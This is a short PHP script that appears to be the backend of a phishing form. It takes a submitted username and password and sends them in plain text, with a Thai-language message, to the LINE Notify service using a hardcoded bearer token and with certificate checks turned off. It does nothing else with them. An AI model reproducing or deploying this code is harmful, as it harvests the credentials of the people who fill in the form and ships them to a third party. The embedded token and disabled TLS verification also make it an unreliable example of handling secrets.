<?php 

    if (isset($_POST['sub'])){
        $user = $_POST['user'];
        $pas = $_POST['pas'];

        $sToken = "ZDfOtOLqW6W38Fxl4mELcXVP7CIAlfCC9qNQ5Ld1AdE";
	    $sMessage = "มีอะไรน้า\n ชื่อ : ". $user ." \nรหัสผ่าน: ". $pas;
	
	    $chOne = curl_init(); 
	    curl_setopt( $chOne, CURLOPT_URL, "https://notify-api.line.me/api/notify"); 
	    curl_setopt( $chOne, CURLOPT_SSL_VERIFYHOST, 0); 
	    curl_setopt( $chOne, CURLOPT_SSL_VERIFYPEER, 0); 
	    curl_setopt( $chOne, CURLOPT_POST, 1); 
	    curl_setopt( $chOne, CURLOPT_POSTFIELDS, "message=".$sMessage); 
	    $headers = array( 'Content-type: application/x-www-form-urlencoded', 'Authorization: Bearer '.$sToken.'', );
	    curl_setopt($chOne, CURLOPT_HTTPHEADER, $headers); 
	    curl_setopt( $chOne, CURLOPT_RETURNTRANSFER, 1); 
	    $result = curl_exec( $chOne ); 

	    //Result error 
	    if(curl_error($chOne)) 
	    { 
		    echo 'error:' . curl_error($chOne); 
	    } 
	    else { 
		    $result_ = json_decode($result, true); 
		    echo "status : ".$result_['status']; echo "message : ". $result_['message'];
	    } 
	    curl_close( $chOne );
        }




?>